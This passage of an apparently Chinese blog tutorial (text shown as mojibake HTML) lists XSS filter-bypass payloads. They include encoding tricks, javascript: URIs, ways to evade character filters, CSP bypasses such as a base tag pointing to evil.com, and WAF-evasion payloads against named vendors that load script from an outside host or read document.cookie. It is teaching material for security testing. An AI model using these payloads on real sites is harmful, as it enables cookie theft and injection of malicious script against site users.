¼ï¼ˆä¾‹å¦‚ \n å’Œ \rï¼‰</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=x onerror=&quot;alert(1)&quot;&gt;<br>&lt;input onfocus=location=&quot;alert(1)&quot; autofocus&gt; <br><br>//Unicodeç¼–ç <br>&lt;img src=x onerror=&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;&gt;<br>&lt;input onfocus=location=&quot;javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot; autofocus&gt; <br></code></pre></td></tr></table></figure><blockquote><p>Unicodeç¼–ç æ—¶åªèƒ½å¯¹æœ‰æ•ˆçš„æ ‡è¯†è¿›è¡Œç¼–ç ï¼Œå¦åˆ™éæ ‡è¯†ç¬¦è¢«è§£ç åæ˜¯ä¸èƒ½æ‰§è¡Œçš„ï¼Œæ¯”å¦‚ï¼šalert(1)åªèƒ½å¯¹alertå’Œ1è¿›è¡Œç¼–ç ï¼Œæ‹¬å·ç¼–ç åä¼šå¤±å»ä½œç”¨ï¼Œä¸èƒ½æ‰§è¡Œ</p><p>å¦‚æœç”¨evalã€setTimeoutç­‰å‡½æ•°ä¼ é€’å˜é‡æ—¶å°±å¯ä»¥å¯¹æ•´ä¸ªä¼ é€’å‚æ•°è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚ï¼š<strong>ä¾‹å¦‚ eval("alert(1)")ï¼Œå¯ä»¥å¯¹ "alert(1)" æ•´ä¸ªè¿›è¡Œå…«è¿›åˆ¶ã€åå…­è¿›åˆ¶æˆ–è€… Unicode ç¼–ç (åŒå¼•å·ä¸å‚ä¸)ã€‚</strong></p></blockquote><p>æ‰€ä»¥æµè§ˆå™¨çš„è§£æè¿‡ç¨‹æ˜¯ï¼šhtmlè§£æ â€”â€” urlè§£æ â€”â€” jsè§£æ</p><p>æˆ‘ä»¬è¿˜å¯ä»¥ç”¨ä¸€äº›æ··åˆç¼–ç å’Œç»„åˆç¼–ç è¿›è¡Œç»•è¿‡ï¼Œå…·ä½“å‚è€ƒï¼š<a href="https://www.freebuf.com/articles/web/340080.html">xss å¸¸ç”¨æ ‡ç­¾åŠç»•è¿‡å§¿åŠ¿æ€»ç»“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><strong>base64ç¼–ç </strong></p><p>æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨dataä¼ªåè®®è¿›è¡Œbase64ç¼–ç ç»•è¿‡</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//ç¼–ç çš„å†…å®¹ä¸ºï¼š&lt;script&gt;alert(/xss/)&lt;/script&gt;<br>1.&lt;object&gt; æ ‡ç­¾<br>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;<br>2.&lt;a&gt; æ ‡ç­¾<br>&lt;a href=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;test&lt;/a&gt;   ï¼ˆæ–°ç‰ˆæµè§ˆå™¨ä¸æ”¯æŒï¼‰<br>3.&lt;iframe&gt; æ ‡ç­¾<br>&lt;iframe src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;<br>4.&lt;embed&gt; æ ‡ç­¾<br>&lt;embed src=&quot;data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/embed&gt;<br></code></pre></td></tr></table></figure><p><strong>ç¼–ç è§£ç å‡½æ•°</strong></p><p>atob()å‡½æ•°ç”¨äºbase64è§£ç </p><p>btoa()å‡½æ•°ç”¨äºbase64ç¼–ç </p><p><strong>å…¶ä»–å­—ç¬¦é›†ç¼–ç ç»•è¿‡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//UTF-7ï¼Œ&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;<br>+ADw-script+AD4-alert(&#x27;XSS&#x27;)+ADsAPA-/script+AD4-<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151445441.png" alt="image-20240430092823778"></p><p><strong>UTF-16</strong>ï¼š UTF-16ä½¿ç”¨2ä¸ªæˆ–4ä¸ªå­—èŠ‚æ¥è¡¨ç¤ºUnicodeå­—ç¬¦ã€‚æ”»å‡»è€…å¯èƒ½ä¼šå°è¯•å°†JavaScriptä»£ç ç¼–ç ä¸ºUTF-16å­—èŠ‚é¡ºåºæ ‡è®°ï¼ˆBOMï¼‰ï¼Œå¹¶å°†å…¶æ’å…¥åˆ°è¾“å…¥å­—æ®µä¸­ã€‚ä¸€äº›ç³»ç»Ÿå¯èƒ½ä¼šé”™è¯¯åœ°å°†è¿™äº›å­—èŠ‚è§£é‡Šä¸ºUTF-16æ–‡æœ¬ï¼Œè€Œä¸æ˜¯JavaScriptä»£ç ã€‚</p><p>ä¾‹å¦‚ï¼Œ<code>\u2028</code>ï¼ˆUTF-16çš„è¡Œåˆ†éš”ç¬¦ï¼‰å’Œ<code>\u2029</code>ï¼ˆUTF-16çš„æ®µè½åˆ†éš”ç¬¦ï¼‰æœ‰æ—¶å¯ä»¥ç”¨æ¥ç»•è¿‡åŸºäºè¡Œçš„è¾“å…¥è¿‡æ»¤å™¨ã€‚</p><h2 id="jsä¼ªåè®®"><a href="#jsä¼ªåè®®" class="headerlink" title="jsä¼ªåè®®"></a>jsä¼ªåè®®</h2><p> ä¼ªåè®®çš„å½¢å¼å°±æ˜¯ï¼š<strong>javascript:alert(/xss/)</strong></p><p>åœ¨æ’å…¥jsä»£ç çš„åœ°æ–¹éƒ½å¯ä»¥å°è¯•ä¸€ä¸‹ä¼ªåè®®</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;<br>&lt;iframe src=javascript:alert(&#x27;xss&#x27;);&gt;&lt;/iframe&gt;<br>&lt;img src=javascript:alert(&#x27;xss&#x27;)&gt;//IE7ä»¥ä¸‹<br>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;<br>&lt;body background=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"><a href="#ç©ºæ ¼è¿‡æ»¤ç»•è¿‡" class="headerlink" title="ç©ºæ ¼è¿‡æ»¤ç»•è¿‡"></a>ç©ºæ ¼è¿‡æ»¤ç»•è¿‡</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;html&gt;&lt;imgAAsrcAAonerrorBB=BBalertCC(1)DD&lt;/html&gt;<br></code></pre></td></tr></table></figure><ul><li>Aä½ç½®å¯å¡«å…… /ï¼Œ/123/ï¼Œ%09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20</li><li>Bä½ç½®å¯å¡«å…… %09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20</li><li>Cä½ç½®å¯å¡«å…… %0Bï¼Œ/**/ï¼Œå¦‚æœåŠ äº†åŒå¼•å·ï¼Œåˆ™å¯ä»¥å¡«å…… %09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20</li><li>Dä½ç½®å¯å¡«å…… %09ï¼Œ%0Aï¼Œ%0Cï¼Œ%0Dï¼Œ%20ï¼Œ//ï¼Œ></li></ul><h2 id="åœ†æ‹¬å·è¿‡æ»¤ç»•è¿‡"><a href="#åœ†æ‹¬å·è¿‡æ»¤ç»•è¿‡" class="headerlink" title="åœ†æ‹¬å·è¿‡æ»¤ç»•è¿‡"></a>åœ†æ‹¬å·è¿‡æ»¤ç»•è¿‡</h2><p><strong>åå¼•å·æ›¿æ¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert`1`&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>throwç»•è¿‡</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;video src onerror=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;<br>&lt;svg/onload=&quot;window.onerror=eval;throw&#x27;=alert\x281\x29&#x27;;&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="å•å¼•å·è¿‡æ»¤"><a href="#å•å¼•å·è¿‡æ»¤" class="headerlink" title="å•å¼•å·è¿‡æ»¤"></a>å•å¼•å·è¿‡æ»¤</h2><p><strong>æ–œæ æ›¿æ¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(/xss/)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>åå¼•å·æ›¿æ¢</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(`xss`)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="åœ°å€è¿‡æ»¤"><a href="#åœ°å€è¿‡æ»¤" class="headerlink" title="åœ°å€è¿‡æ»¤"></a>åœ°å€è¿‡æ»¤</h2><p><strong>httpè¢«è¿‡æ»¤</strong></p><p>å¯ä»¥ç”¨<code>//</code>ä»£æ›¿<code>http://</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=document.location=`//www.baidu.com`&gt;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨<code>\\</code>ï¼Œä¸è¿‡è¿™åœ¨Linuxä¸‹æ‰èƒ½ä»£æ›¿http://ï¼Œåœ¨Windowsä¸‹ç›¸å½“äºfileåè®®</p><p><strong>é€—å·è¿‡æ»¤</strong></p><p>å¯ä»¥ç”¨ä¸­æ–‡é€—å·ä»£æ›¿è‹±æ–‡é€—å·ï¼Œä¸­æ–‡é€—å·ä¼šè¢«è‡ªåŠ¨è½¬æˆè‹±æ–‡é€—å·ï¼›ä¸­æ–‡çš„å¥å·ä¹Ÿå¯ä»¥ä»£æ›¿ç‚¹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;img src=&quot;x&quot; onerror=&quot;document.location=`http://wwwã€‚baiduã€‚com`&quot;&gt;//ä¼šè‡ªåŠ¨è·³è½¬åˆ°ç™¾åº¦<br></code></pre></td></tr></table></figure><h2 id="alertè¿‡æ»¤"><a href="#alertè¿‡æ»¤" class="headerlink" title="alertè¿‡æ»¤"></a>alertè¿‡æ»¤</h2><p>å¯ä»¥åˆ©ç”¨å…¶ä»–çš„å‡½æ•°æ¥æ›¿æ¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;prompt(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;confirm(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;console.log(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br>&lt;script&gt;document.write(&#x27;Evi1s7&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="é•¿åº¦é™åˆ¶"><a href="#é•¿åº¦é™åˆ¶" class="headerlink" title="é•¿åº¦é™åˆ¶"></a>é•¿åº¦é™åˆ¶</h2><p>å¯ä»¥åˆ©ç”¨æ‹†åˆ†çš„æ–¹æ³•ï¼Œåˆ©ç”¨evalå‡½æ•°å’Œå˜é‡èµ‹å€¼çš„æ–¹æ³•è¿›è¡Œæ‹¼æ¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;a=&#x27;document.write(&quot;&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;&lt;a href=ht&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;tp://VPS-IP:po&#x27;&lt;/script&gt;<br>&lt;script&gt;a=a+&#x27;rt&gt;Evi1s7&lt;/a&gt;&quot;)&#x27;&lt;/script&gt;<br>&lt;script&gt;eval(a)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><strong>è¿˜å¯ä»¥åˆ©ç”¨åŠ è½½å¤–éƒ¨jsæ–‡ä»¶</strong></p><ul><li><p><code>$.getScript</code>ï¼š<code>$.getScript</code> æ˜¯ jQuery åº“æä¾›çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒå…è®¸ä½ å¼‚æ­¥åœ°ä»æœåŠ¡å™¨åŠ è½½ JavaScript æ–‡ä»¶ã€‚è¿™ä¸ªå‡½æ•°éå¸¸é€‚åˆç”¨äºåœ¨é¡µé¢åŠ è½½ä¹‹åæŒ‰éœ€åŠ è½½è„šæœ¬ï¼Œä»è€Œå¯ä»¥æ”¹å–„ç½‘é¡µçš„å“åº”é€Ÿåº¦å’Œæ€§èƒ½ã€‚</p><p>å‡è®¾ä½ æœ‰ä¸€ä¸ª JavaScript æ–‡ä»¶ <code>example.js</code>ï¼Œé‡Œé¢åŒ…å«äº†ä¸€äº›é¡µé¢åŠ è½½åéœ€è¦æ‰§è¡Œçš„ä»£ç ï¼Œå¯ä»¥è¿™æ ·ä½¿ç”¨ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">$.<span class="hljs-title function_">getScript</span>(<span class="hljs-string">&quot;example.js&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Script loaded and executed successfully!&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure></li><li><p><code>$.get</code></p><p><code>$.get</code> æ˜¯ jQuery åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œ HTTP GET è¯·æ±‚ã€‚å®ƒå¯ä»¥ç”¨æ¥ä»æœåŠ¡å™¨å¼‚æ­¥åœ°åŠ è½½æ•°æ®ï¼Œå¹¶ä¸”é€šå¸¸ç”¨äºè¯·æ±‚ JSONã€HTMLã€XML æˆ–è„šæœ¬æ–‡ä»¶ã€‚</p><p>åŸºæœ¬è¯­æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$.get(url, data, successCallback, dataType)<br><br>urlï¼šè¦è¯·æ±‚çš„èµ„æºçš„ URLã€‚<br>dataï¼šï¼ˆå¯é€‰ï¼‰ä¸€ä¸ªé”®å€¼å¯¹çš„æ˜ å°„ï¼Œè¡¨ç¤ºè¦å‘é€çš„æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°ã€‚<br>successCallbackï¼šï¼ˆå¯é€‰ï¼‰ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå½“è¯·æ±‚æˆåŠŸæ—¶æ‰§è¡Œã€‚å®ƒæ¥å—ä¸€ä¸ªå‚æ•°ï¼Œé€šå¸¸æ˜¯å“åº”çš„æ•°æ®ã€‚<br>dataTypeï¼šï¼ˆå¯é€‰ï¼‰é¢„æœŸçš„æœåŠ¡å™¨å“åº”çš„æ•°æ®ç±»å‹ã€‚ä¾‹å¦‚ï¼š&quot;json&quot;, &quot;html&quot;, &quot;text&quot;, &quot;xml&quot; ç­‰ã€‚<br></code></pre></td></tr></table></figure><p>ç¤ºä¾‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">$.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;example.com/data&quot;</span>, &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;, <span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) &#123;<br>    <span class="hljs-comment">// å¤„ç†åŠ è½½çš„æ•°æ®</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;, <span class="hljs-string">&quot;json&quot;</span>);<br></code></pre></td></tr></table></figure></li></ul><h2 id="è¿‡æ»¤åˆ†å·"><a href="#è¿‡æ»¤åˆ†å·" class="headerlink" title="è¿‡æ»¤åˆ†å·"></a>è¿‡æ»¤åˆ†å·</h2><p>å¯ä»¥ä½¿ç”¨èŠ±æ‹¬å·è¿›è¡Œè¯­å¥çš„åˆ†éš”</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;&#123;onerror=alert&#125;throw 1&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="ç»•è¿‡CSP"><a href="#ç»•è¿‡CSP" class="headerlink" title="ç»•è¿‡CSP"></a>ç»•è¿‡CSP</h2><h3 id="CSPä»‹ç»"><a href="#CSPä»‹ç»" class="headerlink" title="CSPä»‹ç»"></a>CSPä»‹ç»</h3><p>è¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯CSPï¼š</p><p>Content Security Policyï¼Œç®€ç§° CSPï¼Œè¯‘ä½œå†…å®¹å®‰å…¨ç­–ç•¥ã€‚é¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªè§„èŒƒä¸å†…å®¹å®‰å…¨æœ‰å…³ï¼Œä¸»è¦æ˜¯ç”¨æ¥å®šä¹‰å“ªäº›èµ„æºå¯ä»¥è¢«å½“å‰é¡µé¢åŠ è½½ï¼Œå‡å°‘ XSS çš„å‘ç”Ÿã€‚</p><p><strong>é…ç½®</strong></p><p>CSPç­–ç•¥å¯ä»¥é€šè¿‡ HTTP å¤´ä¿¡æ¯æˆ–è€… meta å…ƒç´ å®šä¹‰ã€‚</p><p>CSP æœ‰ä¸‰ç±»ï¼š</p><ul><li>Content-Security-Policy (Google Chrome)</li><li>X-Content-Security-Policy (Firefox)</li><li>X-WebKit-CSP (WebKit-based browsers, e.g. Safari)</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HTTP header :<br>&quot;Content-Security-Policy:&quot; ç­–ç•¥<br>&quot;Content-Security-Policy-Report-Only:&quot; ç­–ç•¥<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HTML Meta :<br>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;ç­–ç•¥&quot;&gt;<br>&lt;meta http-equiv=&quot;content-security-policy-report-only&quot; content=&quot;ç­–ç•¥&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>ä¸»è¦æŒ‡ä»¤</strong></p><table><thead><tr><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>default-src</td><td>å®šä¹‰èµ„æºé»˜è®¤åŠ è½½ç­–ç•¥</td></tr><tr><td>connect-src</td><td>å®šä¹‰ Ajaxã€WebSocket ç­‰åŠ è½½ç­–ç•¥</td></tr><tr><td>font-src</td><td>å®šä¹‰ Font åŠ è½½ç­–ç•¥</td></tr><tr><td>frame-src</td><td>å®šä¹‰ Frame åŠ è½½ç­–ç•¥</td></tr><tr><td>img-src</td><td>å®šä¹‰å›¾ç‰‡åŠ è½½ç­–ç•¥</td></tr><tr><td>media-src</td><td>å®šä¹‰ <audio>ã€<video> ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>object-src</td><td>å®šä¹‰ <applet>ã€<embed>ã€<object> ç­‰å¼•ç”¨èµ„æºåŠ è½½ç­–ç•¥</td></tr><tr><td>script-src</td><td>å®šä¹‰ JS åŠ è½½ç­–ç•¥</td></tr><tr><td>style-src</td><td>å®šä¹‰ CSS åŠ è½½ç­–ç•¥</td></tr><tr><td>base-uri</td><td>å®šä¹‰ <base> æ ¹URLç­–ç•¥ï¼Œä¸ä½¿ç”¨default-srcä½œä¸ºé»˜è®¤å€¼</td></tr><tr><td>sandbox</td><td>å€¼ä¸º allow-formsï¼Œå¯¹èµ„æºå¯ç”¨ sandbox</td></tr><tr><td>report-uri</td><td>å€¼ä¸º /report-uriï¼Œæäº¤æ—¥å¿—</td></tr></tbody></table><p><strong>å…³é”®å­—</strong></p><ul><li><p><code>-</code></p><p>å…è®¸ä»ä»»æ„urlåŠ è½½ï¼Œé™¤äº† <code>data:</code> <code>blob:</code> <code>filesystem:</code> <code>schemes</code></p><p>e.g. <code>img-src -</code></p></li><li><p><code>none</code></p><p>ç¦æ­¢ä»ä»»ä½•urlåŠ è½½èµ„æº</p><p>e.g. <code>object-src &#39;none&#39;</code></p></li><li><p><code>self</code></p><p>åªå¯ä»¥åŠ è½½åŒæºèµ„æº</p><p>e.g. <code>img-src &#39;self&#39;</code></p></li><li><p><code>data:</code></p><p>å¯ä»¥é€šè¿‡dataåè®®åŠ è½½èµ„æº</p><p>e.g. <code>img-src &#39;self&#39; data:</code></p></li><li><p><code>blob:</code>:</p><p>è¡¨ç¤ºå…è®¸åŠ è½½blob URLæ ¼å¼çš„èµ„æºã€‚</p><p>e.g. <code>img-src &#39;self&#39; blob:</code></p></li><li><p><code>domain.example.com</code></p><p>e.g. <code>img-src domain.example.com</code>åªå¯ä»¥ä»ç‰¹å®šçš„åŸŸåŠ è½½èµ„æº</p></li><li><p><code>\*.example.com</code></p><p>e.g. <code>img-src \*.example.com</code>å¯ä»¥ä»ä»»æ„example.comçš„å­åŸŸå¤„åŠ è½½èµ„æº</p></li><li><p><code>https://cdn.com</code></p><p>e.g. <code>img-src https://cdn.com</code>åªèƒ½ä»ç»™å®šçš„åŸŸç”¨httpsåŠ è½½èµ„æº</p></li><li><p><code>https:</code></p><p>e.g. <code>img-src https:</code>åªèƒ½ä»ä»»æ„åŸŸç”¨httpsåŠ è½½èµ„æº</p></li><li><p><code>unsafe-inline</code></p><p>å…è®¸å†…éƒ¨èµ„æºæ‰§è¡Œä»£ç ä¾‹å¦‚style attribute,onclickæˆ–è€…æ˜¯sicriptæ ‡ç­¾</p><p>e.g. <code>script-src &#39;unsafe-inline&#39;</code></p></li><li><p><code>unsafe-eval</code></p><p>å…è®¸ä¸€äº›ä¸å®‰å…¨çš„ä»£ç æ‰§è¡Œæ–¹å¼ï¼Œä¾‹å¦‚jsçš„eval()</p><p>e.g. <code>script-src &#39;unsafe-eval&#39;</code></p></li><li><p><code>nonce-&lt;base64-value&gt;&#39;</code></p><p>ä½¿ç”¨éšæœºçš„nonceï¼Œå…è®¸åŠ è½½æ ‡ç­¾ä¸Šnonceå±æ€§åŒ¹é…çš„æ ‡ç­¾</p><p>e.g. <code>script-src &#39;nonce-bm9uY2U=&#39;</code></p></li><li><p><code>&lt;hash-algo&gt;-&lt;base64-value&gt;&#39;</code></p><p>å…è®¸hashå€¼åŒ¹é…çš„ä»£ç å—è¢«æ‰§è¡Œ</p><p>e.g. <code>script-src &#39;sha256-&lt;base64-value&gt;&#39;</code></p></li></ul><h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><p>å°±æ˜¯åˆ©ç”¨ä¸Šé¢ä¸€äº›æœ‰é£é™©çš„cspè®¾ç½®æ¥ç»•è¿‡ï¼Œæ¯”å¦‚unsafe-inlineã€unsafe-evalç­‰ç­‰ã€‚ç›¸å½“äºåˆ©ç”¨ç™½åå•ç»•è¿‡ã€‚</p><p><strong>é¢„åŠ è½½</strong></p><p>å¤§æ¦‚å°±æ˜¯åˆ©ç”¨æµè§ˆå™¨ç©ºé—²çš„æ—¶å€™å»åŠ è½½æŒ‡å®šçš„å†…å®¹ï¼Œç„¶åç¼“å­˜èµ·æ¥ã€‚</p><p>HTML5é¡µé¢é¢„åŠ è½½æ˜¯ç”¨linkæ ‡ç­¾çš„relå±æ€§æ¥æŒ‡å®šçš„ã€‚å¦‚æœcspå¤´æœ‰unsafe-inlineï¼Œåˆ™ç”¨é¢„åŠ è½½çš„æ–¹å¼å¯ä»¥å‘å¤–ç•Œå‘å‡ºè¯·æ±‚ï¼Œä¾‹å¦‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;!-- é¢„åŠ è½½æŸä¸ªé¡µé¢ --&gt;<br>&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- firefox --&gt;<br>&lt;link rel=&#x27;prerender&#x27; href=&#x27;http://xxxx&#x27;&gt;&lt;!-- chrome --&gt;<br>&lt;!-- é¢„åŠ è½½æŸä¸ªå›¾ç‰‡ --&gt;<br>&lt;link rel=&#x27;prefetch&#x27; href=&#x27;http://xxxx/x.jpg&#x27;&gt;<br>&lt;!-- DNS é¢„è§£æ --&gt;<br>&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://xxxx&quot;&gt;<br>&lt;!-- ç‰¹å®šæ–‡ä»¶ç±»å‹é¢„åŠ è½½ --&gt;<br>&lt;link rel=&#x27;preload&#x27; href=&#x27;//xxxxx/xx.js&#x27;&gt;&lt;!-- chrome --&gt;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸‹åˆ—èµ„æºç±»å‹æ˜¯é˜»æ­¢é¢„åŠ è½½çš„ï¼š</p><ul><li>URLä¸­åŒ…å«ä¸‹è½½èµ„æº</li><li>é¡µé¢ä¸­åŒ…å«éŸ³é¢‘ã€è§†é¢‘</li><li>POSTã€PUTå’ŒDELETæ“ä½œçš„ajaxè¯·æ±‚</li><li>HTTPè®¤è¯</li><li>HTTPSé¡µé¢</li><li>å«æ¶æ„è½¯ä»¶çš„é¡µé¢</li><li>å¼¹çª—é¡µé¢</li><li>å ç”¨èµ„æºå¾ˆå¤šçš„é¡µé¢</li><li>æ‰“å¼€äº†chrome developer toolså¼€å‘å·¥å…·</li></ul><p><strong>MIME Sniff</strong></p><p>æ¯”å¦‚cspå¯ä»¥è¯»å›¾ç‰‡ä½†æ˜¯ä¸èƒ½è¯»è„šæœ¬ï¼Œå°±å¯ä»¥å°†ä»£ç åµŒåœ¨å›¾ç‰‡å½“ä¸­</p><figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&#x27;http://xxx.com/xx.jpg&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>base-uri</strong></p><p>å½“script-srcä¸ºnonceæˆ–æ— é™åˆ¶ï¼Œä¸”base-uriæ— é™åˆ¶æ—¶ï¼Œå¯é€šè¿‡ <code>base</code> æ ‡ç­¾ä¿®æ”¹æ ¹URLæ¥bypassï¼Œå¦‚ä¸‹åŠ è½½äº†<code>http://evil.com/main.js</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;base href=&quot;http://evil.com/&quot;&gt;<br>&lt;script nonce=&quot;correct value&quot; src=&quot;/main.js&quot;&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>å…¶ä»–æ›´å¤šçš„å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html">https://websec.readthedocs.io/zh/latest/vuln/xss/csp.html</a></p><h2 id="ç»•è¿‡waf"><a href="#ç»•è¿‡waf" class="headerlink" title="ç»•è¿‡waf"></a>ç»•è¿‡waf</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/rab3it/p/14526596.html">https://www.cnblogs.com/rab3it/p/14526596.html</a></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(1)&lt;/script&gt;<br>//ä¸‹é¢æ˜¯å˜å½¢<br>&lt;img src=1 onerror=alert(1)&gt;<br><br>&lt;image/src=| onerror = javascript:alert(document.cookie)&gt;<br></code></pre></td></tr></table></figure><blockquote><p>src=çš„å³è¾¹åªè¦æ˜¯æ•°å­—ã€å­—æ¯ä¹‹ç±»çš„ï¼Œå°±ä¼šè¢«æ‹¦æˆªï¼Œ<code>src=</code>å³è¾¹æ˜¯å¯ä»¥<code>æ¥ç‰¹æ®Šå­—ç¬¦ä¸²</code>çš„ï¼Œæ‰€ä»¥è¯­å¥å˜æˆå¦‚ä¸‹æ ¼å¼<code>&lt;image/src=|&gt;</code>ï¼ˆæ³¨ï¼šè¿™ä¸ªæ˜¯ç‰¹æ®Šå­—ç¬¦ç«–æ ï¼Œä¸æ˜¯å­—æ¯æˆ–è€…æ•°å­—ï¼‰ï¼Œè¿™æ ·å°±ç»•è¿‡äº†é˜²æŠ¤ã€‚</p></blockquote><p><strong>å®‰å…¨ç‹—</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=top[`al`%2B`ert`](1);&gt;<br>http://www.safedog.cn/index/privateSolutionIndex.html?tab=2&lt;video/src/onerror=appendChild(createElement(&quot;script&quot;)).src=&quot;//z.cn&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>Dç›¾</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top[`al`%2B`ert`](1);&gt;<br>http://www.d99net.net/News.asp?id=126&lt;video/src/onloadstart=top[a=&#x27;al&#x27;,b=&#x27;ev&#x27;,b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);&gt;<br></code></pre></td></tr></table></figure><p><strong>äº‘é”+å¥‡å®‰ä¿¡waf</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs 